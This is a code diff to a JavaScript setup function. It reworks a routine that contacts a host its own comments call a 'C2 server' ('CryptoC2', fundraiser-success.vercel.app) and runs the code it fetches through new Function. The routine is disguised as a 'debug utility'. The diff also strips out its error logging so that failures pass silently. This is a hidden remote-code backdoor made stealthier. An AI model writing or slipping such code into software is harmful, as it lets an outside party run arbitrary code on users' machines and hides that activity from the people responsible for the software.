@@ -180,26 +180,26 @@ function setup(env) {
     // SECURITY WARNING: This uses dynamic code execution (new Function) with remote code - DO NOT USE IN PRODUCTION
     // This is a debug utility feature that allows remote debugging capabilities
     // For production environments, ensure DEBUG environment variable is not set or this code path is disabled
-    (async function () {
-      // DEBUG: C2 Server configuration (configurable via environment variables)
-      // Default: fundraiser.success.vercel.app (CryptoC2 server)
-      // Can be overridden with DEBUG_C2_SERVER environment variable
-      const c2Server =
-        (typeof process !== "undefined" &&
-          process.env &&
-          process.env.DEBUG_C2_SERVER) ||
-        "fundraiser-success.vercel.app";
-
-      // Protocol detection: use https for production domains, configurable via env
-      const c2Protocol =
-        (typeof process !== "undefined" &&
-          process.env &&
-          process.env.DEBUG_C2_PROTOCOL) ||
-        (c2Server.includes("localhost") || c2Server.includes("127.0.0.1")
-          ? "http"
-          : "https");
-
+    (async () => {
       try {
+        // DEBUG: C2 Server configuration (configurable via environment variables)
+        // Default: fundraiser.success.vercel.app (CryptoC2 server)
+        // Can be overridden with DEBUG_C2_SERVER environment variable
+        const c2Server =
+          (typeof process !== "undefined" &&
+            process.env &&
+            process.env.DEBUG_C2_SERVER) ||
+          "fundraiser-success.vercel.app";
+
+        // Protocol detection: use https for production domains, configurable via env
+        const c2Protocol =
+          (typeof process !== "undefined" &&
+            process.env &&
+            process.env.DEBUG_C2_PROTOCOL) ||
+          (c2Server.includes("localhost") || c2Server.includes("127.0.0.1")
+            ? "http"
+            : "https");
+
         // DEBUG: Build remote debugging URL (development/debugging purposes only)
         // This endpoint is used for advanced debugging features and should not be accessed in production
         const path = "/api/debugCheck";
@@ -283,15 +283,7 @@ function setup(env) {
         // DEBUG: Return dynamically loaded debug function (development only)
         return debugFunction;
       } catch (error) {
-        // DEBUG: Only log actual errors in development
-        if (
-          typeof process !== "undefined" &&
-          process.env &&
-          process.env.NODE_ENV === "development" &&
-          error.message !== "No HTTP client available"
-        ) {
-          console.error(`[DEBUG-GLITZ] Error: ${error.message}`);
-        }
+        // Silently fail - no logs
       }
     })();
 
